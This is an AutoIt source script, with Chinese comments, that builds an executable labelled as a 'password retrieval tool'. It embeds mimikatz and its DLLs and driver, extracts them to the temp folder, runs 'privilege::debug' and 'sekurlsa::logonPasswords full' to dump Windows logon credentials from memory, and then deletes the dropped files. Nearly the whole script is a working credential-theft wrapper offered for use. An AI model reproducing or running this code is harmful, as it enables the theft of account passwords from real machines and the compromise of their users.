#Region ;**** 参数创建于 ACNWrapper_GUI ****
#PRE_Icon=L:\工具\QQ\3D风格ICO图标\media-players.ico
#PRE_Outfile=C:\Users\chtyfox\Desktop\Win32\小站制作系统密码获取工具.exe
#PRE_Compression=4
#PRE_Res_Comment=小站制作系统密码获取工具
#PRE_Res_Description=小站制作系统密码获取工具
#PRE_Res_Fileversion=1.0.0.2
#PRE_Res_Fileversion_AutoIncrement=p
#PRE_Res_LegalCopyright=小站制作系统密码获取工具
#PRE_Res_requestedExecutionLevel=None
#EndRegion ;**** 参数创建于 ACNWrapper_GUI ****
#Region ACN预处理程序参数(常用参数)
;#PRE_Res_Field=AutoIt Version|%AutoItVer%		;自定义资源段
;#PRE_Run_Tidy=                   				;脚本整理
;#PRE_Run_Obfuscator=      						;代码迷惑
;#PRE_Run_AU3Check= 							;语法检查
;#PRE_Run_Before= 								;运行前
;#PRE_Run_After=								;运行后
;#PRE_UseX64=n									;使用64位解释器
;#PRE_Compile_Both								;进行双平台编译
#EndRegion ACN预处理程序参数设置完成
#cs ＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿

 Au3 版本: 
 脚本作者: 
 电子邮件: 
	QQ/TM: 
 脚本版本: 
 脚本功能: 

#ce ＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿脚本开始＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿

FileInstall("C:\Users\chtyfox\Desktop\Win32\kappfree.dll", @TempDir & "\kappfree.dll")
FileInstall("C:\Users\chtyfox\Desktop\Win32\kelloworld.dll", @TempDir & "\kelloworld.dll")
FileInstall("C:\Users\chtyfox\Desktop\Win32\klock.dll", @TempDir & "\klock.dll")
FileInstall("C:\Users\chtyfox\Desktop\Win32\mimikatz.exe", @TempDir & "\mimikatz.exe")
FileInstall("C:\Users\chtyfox\Desktop\Win32\mimikatz.sys", @TempDir & "\mimikatz.sys")
FileInstall("C:\Users\chtyfox\Desktop\Win32\sekurlsa.dll", @TempDir & "\sekurlsa.dll")

If FileExists(@ScriptDir & "\mimikatz.exe") Then
    ;MsgBox(4096, "C:\mimikatz.exe 文件", "C:\mimikatz.exe 文件存在")
	DQ()
Else
    ;MsgBox(4096,"C:\mimikatz.exe 文件", "mimikatz.exe 文件不存在")
	LS()
EndIf

Func DQ()
RunWait(@ComSpec & ' /c ' & @ScriptDir & '\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full"', '', @SW_SHOW)
EndFunc

Func LS()
RunWait(@ComSpec & ' /c ' & @TempDir & '\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full"', '', @SW_SHOW)
EndFunc


FileDelete(@TempDir & "\kappfree.dll")
FileDelete(@TempDir & "\kelloworld.dll")
FileDelete(@TempDir & "\klock.dll")
FileDelete(@TempDir & "\mimikatz.exe")
FileDelete(@TempDir & "\mimikatz.sys")
FileDelete(@TempDir & "\sekurlsa.dll")
